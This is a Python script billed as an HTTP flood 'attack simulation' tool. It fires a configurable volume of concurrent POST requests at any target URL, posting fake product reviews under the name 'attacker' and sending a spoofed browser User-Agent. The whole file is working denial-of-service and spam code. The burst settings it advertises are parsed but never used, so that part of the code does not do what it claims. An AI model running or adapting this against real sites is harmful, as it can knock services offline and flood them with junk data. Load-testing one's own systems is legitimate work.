import requests
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
import json

def http_flood(url, num_requests, concurrent_requests, burst_size, burst_delay, headers=None):
    """
    Executes an HTTP flooding attack simulation against the specified URL
    
    Args:
        url: Target endpoint URL
        num_requests: Total number of requests to send
        concurrent_requests: Number of concurrent requests
        burst_size: Number of requests per burst
        burst_delay: Delay in seconds between bursts
        headers: Optional HTTP headers to include
    """
    start_time = time.time()
    success_count = 0
    error_count = 0
    
    def send_request(i):
        nonlocal success_count, error_count
        try:
            # Send POST request with form data
            data = {
                "product_id": f"prod{i:04d}",  # Format as prod0001, prod0002, etc.
                "review": f"flood attack {i}",
                "username": "attacker"
            }
            
            response = requests.post(
                url, 
                data=data,  # Send as form data instead of JSON
                headers=headers, 
                timeout=5
            )
            
            if response.status_code == 200:
                success_count += 1
                print(f"Request {i}: Success")
            else:
                error_count += 1
                print(f"Request {i}: Failed - {response.status_code} - {response.text}")
            return f"Request {i}: Status {response.status_code}"
        except Exception as e:
            error_count += 1
            print(f"Request {i}: Error - {str(e)}")
            return f"Request {i}: Error - {str(e)}"
    
    # Using ThreadPoolExecutor to manage concurrent requests
    with ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
        futures = [executor.submit(send_request, i) for i in range(num_requests)]
        
        # Print progress
        completed = 0
        for future in futures:
            result = future.result()
            completed += 1
            if completed % 50 == 0 or completed == num_requests:
                print(f"Progress: {completed}/{num_requests} requests completed")
    
    # Print summary statistics
    duration = time.time() - start_time
    print("\n----- HTTP Flood Attack Simulation Results -----")
    print(f"Target URL: {url}")
    print(f"Total Requests: {num_requests}")
    print(f"Concurrent Connections: {concurrent_requests}")
    print(f"Total Duration: {duration:.2f} seconds")
    print(f"Requests per second: {num_requests/duration:.2f}")
    print(f"Success rate: {success_count/num_requests*100:.2f}%")
    print(f"Error rate: {error_count/num_requests*100:.2f}%")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Flooding Attack Simulation Tool with Bursts")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--requests", type=int, default=1000, help="Total number of requests to send")
    parser.add_argument("--concurrent", type=int, default=25, help="Number of concurrent requests within a burst")
    parser.add_argument("--burst-size", type=int, default=100, dest='requests_per_burst', help="Number of requests per burst")
    parser.add_argument("--burst-delay", type=int, default=1, dest='burst_delay', help="Delay in seconds between bursts")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", help="User-Agent string")
    
    args = parser.parse_args()
    
    headers = {
        "User-Agent": args.user_agent,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    
    print(f"Starting HTTP flood simulation against {args.url}")
    print(f"Total requests: {args.requests}, Concurrent per burst: {args.concurrent}")
    print(f"Requests per burst: {args.requests_per_burst}, Delay between bursts: {args.burst_delay}s")
    print("Press Ctrl+C to abort\n")
    
    try:
        http_flood(args.url, args.requests, args.concurrent, args.requests_per_burst, args.burst_delay, headers)
    except KeyboardInterrupt:
        print("\nSimulation aborted by user")